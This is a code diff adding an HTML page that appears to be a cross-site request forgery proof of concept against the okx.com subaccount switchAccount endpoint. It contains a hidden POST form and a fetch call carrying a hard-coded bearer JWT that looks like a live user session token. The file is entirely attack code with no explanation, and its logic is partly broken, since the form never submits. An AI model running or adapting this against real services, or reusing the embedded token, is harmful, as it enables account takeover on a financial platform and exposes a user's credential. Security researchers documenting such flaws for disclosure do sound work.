@@ -1,0 +1,19 @@
+<html>
+  <body>
+    <form id="csrfForm" action="https://www.okx.com/v3/users/subaccount/switchAccount" method="POST">
+      <input type="hidden" name="loginId" value="testio">
+    </form>
+
+    <script>
+      // Create a new request to add the Authorization header
+      fetch("https://www.okx.com/v3/users/subaccount/switchAccount", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJleDExMDE3Mjk5OTI1NjkzOTRFOERDQkQ3OEFENzJGMUVBMWNFbGwiLCJ1aWQiOiJNdHp3dkxqYktwclpJb0d4NUZIaHF3PT0iLCJzdGEiOjAsIm1pZCI6Ik10end2TGpiS3ByWklvR3g1RkhocXc9PSIsImlhdCI6MTczMDI0NzA2NSwiZXhwIjoxNzMwODUxODY1LCJiaWQiOjAsImRvbSI6Ind3dy5va3guY29tIiwiZWlkIjoxLCJpc3MiOiJva2NvaW4iLCJkaWQiOiIrMmVXR2RRcXVoSFdMakZPSUNDQ3hLYm11UzFkMmNaOGU2TGZLSW1ydDhRUXdhd0dIQUxOWVZMSmhPU0FyZTVnIiwibGlkIjoiTXR6d3ZMamJLcHJaSW9HeDVGSGhxdz09IiwidWZiIjoiUFR5QThXMDl6RlVKQkdKNllSTkdZdz09IiwidXBiIjoiaUJyYTJWaE5va3lSaWh4aUovM3pFdz09Iiwia3ljIjoyLCJreWkiOiJEZ3hsd0xJSHR0TVM2VEV3Um5BUjVyZFRwQ1pLZzUvNktuMW14YWlyWkNtL2o5Y0JRc0x5SzZXYkhSWjNQL2pzN3lkRi9ZTkNHUVcvNXlpNFZCelQzUT09IiwiY3BrIjoiaEJ2M21IRmNvSURMblNyRnp0R1NOWkxPb1pTazVtQThIcFBwT0w4UTVOV0RqUnEyaE1qR1puS0xHT3JVWDJGQ3ZxVHRXQXJZVWVnanZpOXdFVDlaOXNhdUtiZlJYM2FDUnhXMmVxd3dxVExoMTRtRmo1T29VeUpoMENrOHFjcEVVZWJrdFFMUGcwTFluV0NwcE1hQzNsWVkrZVRQYUo1clhJRmRzQTliZStNPSIsInZlciI6MSwiY2x0IjoyLCJzdWIiOiI1OUQ1MEYyN0EzMjI5QTQxRDEzM0FERDNENTE4RTRFNyJ9.wYNxIiR1oqkqrWp2Go8yubXAPU38bQB0js8fQLU5dC08rAb2MMLg3ajFXNdgd1efcFCxD1VyEHYCK6pwBcVfgw"
+        },
+        body: JSON.stringify({ "loginId": "testio" })
+      });
+    </script>
+  </body>
+</html>
